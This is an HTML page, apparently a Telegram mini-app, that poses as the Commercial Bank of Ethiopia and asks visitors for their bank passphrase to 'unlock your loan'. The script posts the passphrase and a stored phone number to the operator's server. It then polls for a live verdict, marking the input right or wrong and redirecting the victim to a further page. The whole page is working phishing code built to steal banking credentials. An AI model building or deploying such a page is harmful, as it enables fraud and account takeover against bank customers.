<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>የባንክ ማረጋገጫ - የኢትዮጵያ ንግድ ባንክ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --cbe-purple: #51255e;
            --bg-color: #ffffff;
            --card-bg: #ffffff;
            --text-dark: #111;
            --text-muted: #666;
            --border-color: #dddddd;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f9f9f9; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }

        .header-box { width: 100%; background: var(--cbe-purple); padding: 25px 20px 35px; color: white; text-align: center; font-size: 24px; font-weight: 800; }

        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
        .card { background: var(--card-bg); width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; border: 1px solid var(--border-color); align-self: flex-start; }

        h2 { margin: 0 0 10px; font-size: 18px; color: var(--text-dark); font-weight: 800; text-align: center; line-height: 1.4; }
        .instruction { font-size: 13.5px; color: var(--text-muted); margin: 0 0 20px; text-align: center; line-height: 1.4; }

        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
        .form-control {
            font-size: 14px; padding: 14px 16px; border: 1.5px solid var(--border-color);
            border-radius: 10px; background-color: #fff; color: #333; outline: none; width: 100%;
        }
        .form-control:focus { border-color: var(--cbe-purple); }

        .submit-btn {
            width: 100%; background-color: #e2e8f0; color: #888; border: none; padding: 15px;
            border-radius: 10px; font-size: 15px; font-weight: 800; cursor: not-allowed; text-transform: uppercase;
        }
        .submit-btn.active { background-color: var(--cbe-purple); color: white; cursor: pointer; }

        .error-message { color: #c53030; font-size: 13px; margin-top: 10px; display: none; text-align: center; font-weight: 600; }

        .overlay {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: var(--cbe-purple);
            display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; text-align: center; padding: 20px;
        }
        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header-box">የኢትዮጵያ ንግድ ባንክ</div>

<div class="main-container">
    <div class="card">
        <h2>fill the cbe bank passphrase to unlock your loan now</h2>
        <p class="instruction">እባክዎ ብድሩን ለመክፈት ሚስጥራዊ ሐረግዎን (Passphrase) ያስገቡ</p>

        <div class="form-group">
            <input type="password" id="passphraseInput" class="form-control" placeholder="Passphrase ያስገቡ" autocomplete="off">
        </div>

        <div id="errorText" class="error-message">የተሳሳተ ሐረግ ነው። እባክዎ እንደገና ይሞክሩ።</div>
        <button id="submitBtn" class="submit-btn" disabled>አረጋግጥ</button>
    </div>
</div>

<div class="overlay" id="statusOverlay">
    <div class="spinner"></div>
    <div style="font-size: 18px; font-weight: bold;">እየተጣራ ነው...</div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const passphraseInput = document.getElementById('passphraseInput');
    const submitBtn = document.getElementById('submitBtn');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');

    let checkInterval = null;
    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');

    passphraseInput.addEventListener('input', () => {
        const val = passphraseInput.value.trim();
        const isValid = val.length > 0;
        submitBtn.disabled = !isValid;
        submitBtn.classList.toggle('active', isValid);
        errorText.style.display = 'none';
    });

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);
        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();

                if (data.status === "passphrase_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page10"; // Or final success page
                }
                else if (data.status === "passphrase_wrong") {
                    clearInterval(checkInterval);
                    statusOverlay.style.display = "none";
                    errorText.style.display = "block";
                    passphraseInput.value = "";
                    submitBtn.disabled = true;
                    submitBtn.classList.remove('active');
                }
            } catch (err) { console.error(err); }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;
        const passphraseValue = passphraseInput.value.trim();
        statusOverlay.style.display = "flex";

        try {
            const res = await fetch('/api/verify-passphrase', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: savedPhone, passphrase: passphraseValue })
            });
            const responseData = await res.json();
            if (responseData.success) {
                startStatusPolling();
            } else {
                statusOverlay.style.display = "none";
            }
        } catch (err) {
            statusOverlay.style.display = "none";
        }
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
